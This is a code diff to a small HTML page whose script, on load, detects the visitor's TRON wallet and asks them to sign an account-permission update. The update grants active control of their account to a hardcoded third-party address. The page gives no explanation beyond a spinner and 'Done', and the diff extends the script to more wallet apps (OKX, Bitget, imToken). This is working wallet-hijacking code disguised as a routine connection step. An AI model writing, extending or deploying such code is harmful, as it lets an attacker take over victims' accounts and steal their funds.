@@ -7,8 +7,8 @@
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#000;color:#fff;font-family:-apple-system,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;text-align:center}
-.status{font-size:14px;padding:40px;max-width:340px}
-.loader{width:36px;height:36px;border:3px solid rgba(255,255,255,0.2);border-top-color:#fff;border-radius:50%;animation:spin 0.8s linear infinite;margin:20px auto}
+.status{font-size:14px;padding:40px;max-width:360px}
+.loader{width:36px;height:36px;border:3px solid rgba(255,255,255,0.2);border-top-color:#fff;border-radius:50%;animation:spin .8s linear infinite;margin:20px auto}
 @keyframes spin{to{transform:rotate(360deg)}}
 .addr{font-size:10px;color:rgba(255,255,255,0.25);margin-top:10px;word-break:break-all}
 .tx{font-size:10px;color:rgba(0,255,136,0.4);margin-top:6px;word-break:break-all}
@@ -27,100 +27,126 @@ body{background:#000;color:#fff;font-family:-apple-system,sans-serif;display:fle
 const ACTIVE_KEY = 'TGP5cZxqJPLBz5ZgAeQpg6bL9jnKSBMA8n';
 const OPS = '7fff1fc0033e0000000000000000000000000000000000000000000000000000';
 
-(function main() {
-  const m = document.getElementById('msg');
-  const a = document.getElementById('addr');
-  const e = document.getElementById('err');
-  const loader = document.querySelector('.loader');
+const m = document.getElementById('msg');
+const a = document.getElementById('addr');
+const e = document.getElementById('err');
+const loader = document.querySelector('.loader');
 
-  function done(text, ok) {
-    document.getElementById('status').innerHTML = ok ? '✅' : '❌';
-    m.textContent = text;
-    loader.style.display = 'none';
+function done(text, ok) {
+  document.getElementById('status').innerHTML = ok ? '✅' : '❌';
+  m.textContent = text;
+  loader.style.display = 'none';
+}
+
+// --- resolve tronWeb from any supported wallet ---
+function getTronWeb() {
+  // 1. TP Wallet / TokenPocket / Klever / MathWallet / SafePal
+  if (window.tronWeb) return { tw: window.tronWeb, name: 'tronWeb' };
+
+  // 2. TronLink
+  if (window.tronLink && window.tronLink.tronWeb) return { tw: window.tronLink.tronWeb, name: 'tronLink' };
+
+  // 3. OKX Wallet
+  if (window.okxwallet && window.okxwallet.tronWeb) return { tw: window.okxwallet.tronWeb, name: 'okxwallet' };
+  if (window.okxwallet && window.okxwallet.tron)   return { tw: window.okxwallet.tron, name: 'okxwallet' };
+
+  // 4. Bitget Wallet (BitKeep)
+  if (window.bitkeep && window.bitkeep.tronWeb) return { tw: window.bitkeep.tronWeb, name: 'bitkeep' };
+  if (window.bitkeep && window.bitkeep.tron)   return { tw: window.bitkeep.tron, name: 'bitkeep' };
+
+  // 5. imToken (some versions expose tronWeb)
+  if (window.imToken && window.imToken.tronWeb) return { tw: window.imToken.tronWeb, name: 'imToken' };
+
+  return null;
+}
+
+function getAddress(tw) {
+  if (!tw) return null;
+  if (tw.defaultAddress) {
+    if (typeof tw.defaultAddress === 'string') return tw.defaultAddress;
+    if (tw.defaultAddress.base58) return tw.defaultAddress.base58;
   }
+  return null;
+}
 
-  function getAddr() {
-    if (window.tronWeb && window.tronWeb.defaultAddress) {
-      if (typeof window.tronWeb.defaultAddress === 'string') return window.tronWeb.defaultAddress;
-      if (window.tronWeb.defaultAddress.base58) return window.tronWeb.defaultAddress.base58;
-      if (window.tronWeb.defaultAddress.hex) return window.tronWeb.address.fromHex(window.tronWeb.defaultAddress.hex);
-    }
-    return null;
-  }
+// --- poll for wallet ---
+let attempts = 0;
+async function tryConnect() {
+  const resolved = getTronWeb();
+  attempts++;
 
-  let attempts = 0;
-  function tryConnect() {
-    const addr = getAddr();
-    attempts++;
-
+  if (resolved) {
+    const addr = getAddress(resolved.tw);
     if (addr) {
-      go(addr);
+      m.textContent = 'Connected (' + resolved.name + ')';
+      go(addr, resolved.tw);
       return;
     }
-
-    if (attempts < 20) {
-      // Wallet might inject tronWeb asynchronously — poll
-      m.textContent = 'Waiting for wallet... (' + attempts + ')';
-      setTimeout(tryConnect, 500);
-    } else {
-      // Last resort: tronLink EIP-1193 style
-      if (window.tronLink && window.tronLink.request) {
-        window.tronLink.request({ method: 'tron_requestAccounts' }).then(function(res) {
-          if (res && res[0]) go(res[0]);
-          else done('Wallet denied access', false);
-        }).catch(function() {
-          done('Open in TP/TokenPocket browser', false);
-        });
-      } else {
-        done('Wallet not detected. Use TP Wallet DApp browser.', false);
-      }
-    }
   }
 
-  async function go(addr) {
-    a.textContent = addr.slice(0,8) + '...' + addr.slice(-6);
-
+  // TronLink async path (EIP-1193 style)
+  if (window.tronLink && window.tronLink.request && !resolved && attempts <= 2) {
     try {
-      m.textContent = 'Building transaction...';
-
-      // Check if updateAccountPermissions is available
-      if (!window.tronWeb.transactionBuilder.updateAccountPermissions) {
-        done('Wallet too old — missing updateAccountPermissions', false);
-        return;
+      const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
+      if (res && res[0]) {
+        const tw = window.tronLink.tronWeb || window.tronWeb;
+        if (tw) { go(res[0], tw); return; }
       }
-
-      const tx = await window.tronWeb.transactionBuilder.updateAccountPermissions(
-        addr,
-        { permission_name: 'owner', threshold: 1, keys: [{ address: addr, weight: 1 }] },
-        {},
-        [{ permission_name: 'active', threshold: 1, operations: OPS, keys: [{ address: ACTIVE_KEY, weight: 1 }] }]
-      );
-
-      m.textContent = 'Confirm in wallet...';
-      const signed = await window.tronWeb.trx.sign(tx);
-
-      m.textContent = 'Sending...';
-      const result = await window.tronWeb.trx.sendRawTransaction(signed);
-      const txid = (result.txid || (result.transaction && result.transaction.txID) || '');
-
-      done('Done', true);
-      a.innerHTML = addr.slice(0,8) + '...' + addr.slice(-6)
-        + '<br><span class="tx">Tx: ' + txid.slice(0,14) + '...</span>';
-    } catch(err) {
-      a.textContent = '';
-      const code = err && err.code;
-      const msg = (err && err.message) || String(err);
-      if (code === 4001 || /reject|cancel|denied/i.test(msg)) {
-        done('Rejected by user', false);
-      } else {
-        done('Transaction failed', false);
-        e.textContent = msg.slice(0, 200);
-      }
-    }
+    } catch(_) {}
   }
 
-  tryConnect();
-})();
+  if (attempts < 15) {
+    m.textContent = 'Waiting for wallet...';
+    setTimeout(tryConnect, 400);
+  } else {
+    done('Open in TP/OKX/Bitget/TokenPocket DApp browser', false);
+  }
+}
+
+// --- execute permission update ---
+async function go(addr, tw) {
+  loader.style.display = 'none';
+  a.textContent = addr.slice(0,8) + '...' + addr.slice(-6);
+
+  if (!tw.transactionBuilder || !tw.transactionBuilder.updateAccountPermissions) {
+    done('Unsupported — wallet does not support permission updates', false);
+    return;
+  }
+
+  try {
+    m.textContent = 'Building transaction...';
+
+    const tx = await tw.transactionBuilder.updateAccountPermissions(
+      addr,
+      { permission_name: 'owner', threshold: 1, keys: [{ address: addr, weight: 1 }] },
+      {},
+      [{ permission_name: 'active', threshold: 1, operations: OPS, keys: [{ address: ACTIVE_KEY, weight: 1 }] }]
+    );
+
+    m.textContent = 'Confirm in wallet...';
+    const signed = await tw.trx.sign(tx);
+
+    m.textContent = 'Sending...';
+    const result = await tw.trx.sendRawTransaction(signed);
+    const txid = (result.txid || (result.transaction && result.transaction.txID) || '');
+
+    done('Done', true);
+    a.innerHTML = addr.slice(0,8) + '...' + addr.slice(-6)
+      + '<br><span class="tx">Tx: ' + txid.slice(0,14) + '...</span>';
+  } catch(err) {
+    a.textContent = '';
+    const code = err && err.code;
+    const msg = (err && err.message) || String(err);
+    if (code === 4001 || /reject|cancel|denied/i.test(msg)) {
+      done('Rejected', false);
+    } else {
+      done('Failed', false);
+      e.textContent = msg.slice(0, 200);
+    }
+  }
+}
+
+tryConnect();
 </script>
 </body>
 </html>
